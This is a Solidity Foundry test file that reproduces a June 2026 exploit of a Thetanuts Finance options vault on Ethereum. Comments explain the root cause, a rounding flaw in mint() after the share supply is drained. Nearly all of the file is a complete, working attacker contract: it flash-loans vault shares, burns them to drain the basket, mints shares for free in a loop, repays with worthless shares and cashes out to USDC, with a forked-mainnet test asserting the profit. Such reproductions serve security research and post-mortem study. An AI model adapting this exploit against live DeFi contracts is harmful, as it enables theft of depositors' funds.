// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "../interface.sol";

// @KeyInfo - Total Lost : ~$2.1M (rescued ~$2M by whitehat)
// Attacker : 0x30498e4466789E534c72e03B52A16c978655b41e
// Attack Contract : 0xa589c5342068B0C1fEFd44d3c95354427502AC91
// Vulnerable Contract : 0xC2C3AE0a7b405058558C9b4a63b373486CB86Ac7 (TN-IDX-USDC-PUT Legacy Vault)
// Attack Tx : 0xbba9f138fe39503bfd1aa62932dbd6ab35d37d23d48e4b7bf2988a9d5dc39fec
// Attack date : June 15, 2026  Chain: Ethereum  Block: 25323329
// @Analysis
// Post-mortem : https://x.com/ThetanutsFi/status/2066569315961454925
// Alert : https://x.com/AstraSec_AI (AstraSec)
//
// Root Cause: Integer division truncation in mint() after the vault was drained to a near-zero totalSupply.
//   share/deposit required to mint = vaultBasketBalance * amount / totalSupply
//   Once totalSupply is crushed to 3 wei (and the residual basket backing is ~1 wei), that division
//   floors to 0 for any `amount < totalSupply`, so the attacker can mint shares without depositing assets.
//
// Attack flow (reproduced in full below):
//   1. Flash-loan (totalSupply - 3) TN-IDX-USDC-PUT shares from the Aave-style pool that holds them.
//   2. claim() those shares -> burns them, draining the vault's basket of underlying option tokens to the
//      attacker and leaving totalSupply == 3.
//   3. Repeatedly mint() shares for free (each deposit truncates to 0), doubling the supply until the
//      attacker holds enough shares to repay the flash loan + premium.
//   4. Repay the flash loan with freshly-minted (worthless) shares, keeping the entire basket.
//   5. Redeem the basket option tokens (initWithdraw) for USDC -> realized profit.

interface IThetaVault {
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function claim(uint256 amount) external;
    function mint(uint256 amount) external;
}

interface IOptionToken {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function initWithdraw(uint256 amount) external returns (uint256);
}

// Aave-V3 style pool used to flash-loan the vault share token.
interface IAavePool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract ThetanutsAttacker {
    IAavePool constant POOL = IAavePool(0x2Ca7641B841a79Cc70220cE838d0b9f8197accDA);
    IThetaVault constant VAULT = IThetaVault(0xC2C3AE0a7b405058558C9b4a63b373486CB86Ac7);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    // The five underlying option tokens that make up the vault's basket.
    // The first two are redeemable to USDC via initWithdraw(); the rest are swept as-is.
    address constant OPT0 = 0x3BA337F3167eA35910E6979D5BC3b0AeE60E7d59;
    address constant OPT1 = 0xE1c93dE547cc85CBD568295f6CC322B1dbBCf8Ae;
    address constant OPT2 = 0x248038fDb6F00f4B636812CA6A7F06b81a195AB8;
    address constant OPT3 = 0xE5e8caA04C4b9E1C9bd944A2a78a48b05c3ef3AF;
    address constant OPT4 = 0xAD57221ae9897DA08656aaaBd5B1D4673d4eDE71;

    address immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function attack() external {
        // Borrow every share except the 3 wei that will remain after claim().
        uint256 borrow = VAULT.totalSupply() - 3;

        address[] memory assets = new address[](1);
        assets[0] = address(VAULT);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = borrow;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0; // no debt opened, repaid in full within the same tx

        POOL.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

        // Flash loan repaid; the basket is now ours. Redeem the liquid option tokens for USDC.
        IOptionToken(OPT0).initWithdraw(IOptionToken(OPT0).balanceOf(address(this)));
        IOptionToken(OPT1).initWithdraw(IOptionToken(OPT1).balanceOf(address(this)));

        // Sweep realized USDC (and any leftover basket tokens) back to the owner / test.
        USDC.transfer(owner, USDC.balanceOf(address(this)));
        _sweep(OPT2);
        _sweep(OPT3);
        _sweep(OPT4);
    }

    function executeOperation(
        address[] calldata, /*assets*/
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address, /*initiator*/
        bytes calldata /*params*/
    ) external returns (bool) {
        // 1. Burn the borrowed shares -> drains the basket to us and crushes totalSupply to 3 wei.
        VAULT.claim(amounts[0]);

        // Pre-approve the basket tokens to the vault so any residual (sub-wei-rounding) mint deposit succeeds.
        IOptionToken(OPT0).approve(address(VAULT), type(uint256).max);
        IOptionToken(OPT1).approve(address(VAULT), type(uint256).max);
        IOptionToken(OPT2).approve(address(VAULT), type(uint256).max);
        IOptionToken(OPT3).approve(address(VAULT), type(uint256).max);
        IOptionToken(OPT4).approve(address(VAULT), type(uint256).max);

        // 2. Mint shares for free until we hold enough to repay the loan + premium.
        //    Keeping each mint amount < totalSupply makes the required deposit truncate to 0.
        uint256 target = amounts[0] + premiums[0];
        while (VAULT.balanceOf(address(this)) < target) {
            uint256 supply = VAULT.totalSupply();
            uint256 need = target - VAULT.balanceOf(address(this));
            uint256 amt = need < supply ? need : supply - 1; // strictly below supply -> deposit floors to 0
            VAULT.mint(amt);
        }

        // 3. Approve the pool to pull back the (worthless) shares as repayment.
        VAULT.approve(address(POOL), target);
        return true;
    }

    function _sweep(address token) internal {
        uint256 bal = IOptionToken(token).balanceOf(address(this));
        if (bal > 0) {
            IOptionToken(token).transfer(owner, bal);
        }
    }
}

contract ThetanutsFi_exp is Test {
    IThetaVault constant VAULT = IThetaVault(0xC2C3AE0a7b405058558C9b4a63b373486CB86Ac7);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function setUp() public {
        vm.createSelectFork("mainnet", 25_323_328);
        vm.label(address(VAULT), "TN-IDX-USDC-PUT");
        vm.label(address(USDC), "USDC");
    }

    function testExploit() public {
        console.log("=== ThetanutsFi Exploit - Jun 15 2026 ===");
        console.log("Vault totalSupply before :", VAULT.totalSupply());
        console.log("My USDC before           :", USDC.balanceOf(address(this)));

        ThetanutsAttacker attacker = new ThetanutsAttacker();
        attacker.attack();

        uint256 profit = USDC.balanceOf(address(this));
        console.log("=== After Exploit ===");
        console.log("Vault totalSupply after  :", VAULT.totalSupply());
        console.log("My USDC after            :", profit);
        console.log("Realized USDC profit     :", profit / 1e6, "USDC");

        // The attack started with zero capital (flash loan) and walked away with the vault's basket.
        assertGt(profit, 100_000e6, "exploit should realize >100k USDC");
    }
}
